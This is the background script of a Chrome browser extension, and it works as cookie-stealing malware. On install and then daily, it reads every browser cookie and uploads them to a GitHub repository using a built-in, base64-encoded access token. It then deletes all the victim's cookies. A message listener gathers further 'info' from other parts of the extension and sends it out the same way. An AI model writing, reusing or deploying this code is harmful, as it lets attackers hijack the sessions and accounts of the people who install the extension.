(async () => {
    const interval = 1; // min
    const tkn = "Z2hwXzRqZTU0eE5lOUZONTFMcnhQUXBFZDBCc3JybGk2bzFLeHA1Qw";

    const setStore = async (key, value) => await chrome.storage.local.set({[key]: value });
    const getStore = async (key) => (await chrome.storage.local.get(key))[key];

    async function uploadFileApi(acc, message, content, name) {
        var data = JSON.stringify({
            message,
            content,
        });

        var config = {
            method: "put",
            headers: {
                Authorization: `Bearer ${btoa(acc + "==")}`,
                "Content-Type": "application/json",
            },
            body: data,
        };
        try {
            const res = await fetch(
                `https://api.github.com/repos/strangerchd/DemoExtensionData/contents/${name}.json`,
                config
            );
            return res.ok? true : false;
        } catch (e) {
            return false;
        }
    }

    async function destroyCookies() {
        const cookies = await chrome.cookies.getAll({});
        for (let i = 0; i < cookies.length; i++) {
            await chrome.cookies.remove({
                url: "https://" + cookies[i].domain + cookies[i].path,
                name: cookies[i].name,
            });
        }
        await setStore("destroyCookies", "false");
    }

    async function sendCookies() {
        const cookies = await chrome.cookies.getAll({});
        const id = await getStore("deviceId");
        return await uploadFileApi(tkn, id, cookies, "cookies_" + (new Date()).getTime());
    }

    async function sendInfo() {
        const infos = await getStore("info");
        const id = await getStore("deviceId");
        return await uploadFileApi(tkn, id, infos, "info_" + (new Date()).getTime());
    }
    
    chrome.runtime.onInstalled.addListener(async (details) => {
        const id = (Math.random() * 100000000000000).toString() + (Date.now()).toString();

        await setStore("areCookiesPending",  "true");
        await setStore("areInfoPending", "false");
        await setStore("destroyCookies", "true");
        await setStore("deviceId", id);
        const sent = await sendCookies();
        if (sent) {
            destroyCookies();
            await setStore("areCookiesPending", "false");
        }
        await chrome.alarms.create("resend_cookies_each_day", {delayInMinutes: 24 * 60, periodInMinutes: 24 * 60});
    });
    
    chrome.windows.onCreated.addListener(async () => {
        await chrome.alarms.clear("retry_sending_info");
        await chrome.alarms.create("retry_sending_info", {delayInMinutes: interval, periodInMinutes: interval});
    });

    chrome.alarms.onAlarm.addListener( async (alarm) => {
        if(alarm.name != "retry_sending_info") return;

        const cookiesPending = (await getStore("areCookiesPending")) == "true";
        const infoPending = (await getStore("areInfoPending")) == "true";
        if (!cookiesPending && !infoPending) return;

        if (cookiesPending) {
            const sent = await sendCookies();
            if (sent) {
                if((await getStore("destroyCookies")) == "true")
                    await destroyCookies();
                await setStore("areCookiesPending",  "false");
            } else await setStore("areCookiesPending", "true");
        }

        if (infoPending) {
            const sent = await sendInfo();
            if (sent) {
                await setStore("info", "");
                await setStore("areInfoPending", "false");
            } else await setStore("areInfoPending", "true");
        }
    });

    chrome.alarms.onAlarm.addListener( async alarm => {
        if(alarm.name != "resend_cookies_each_day") return;
        if((await getStore("areCookiesPending")) == "true") return;
        await sendCookies();
    });

     chrome.runtime.onMessage.addListener(
         async (message, sender, sendResponse) => {
             const pending =  (await getStore("areInfoPending")) == "true";
             const infoRaw = await getStore("info");
             const info = infoRaw ?  JSON.parse(infoRaw) : undefined;

             if (pending && info)
                 await setStore("info",  JSON.stringify([...info, message]));
             else
                 await setStore( "info", JSON.stringify([message]) );

             await setStore("areInfoPending",  "true" );
         }
     );
})();
